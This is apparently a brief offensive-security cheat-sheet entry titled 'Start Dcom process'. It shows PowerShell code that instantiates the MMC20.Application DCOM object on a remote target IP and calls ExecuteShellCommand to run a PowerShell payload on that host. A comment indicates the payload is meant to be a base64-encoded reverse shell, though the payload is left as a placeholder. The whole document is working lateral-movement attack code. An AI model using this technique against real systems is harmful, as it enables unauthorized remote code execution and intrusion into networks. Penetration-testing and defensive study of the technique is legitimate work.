# Start Dcom process
```bash
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target-ip>"))

# create a base64 powershell rev-pw

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<entire-payload>","7")
```
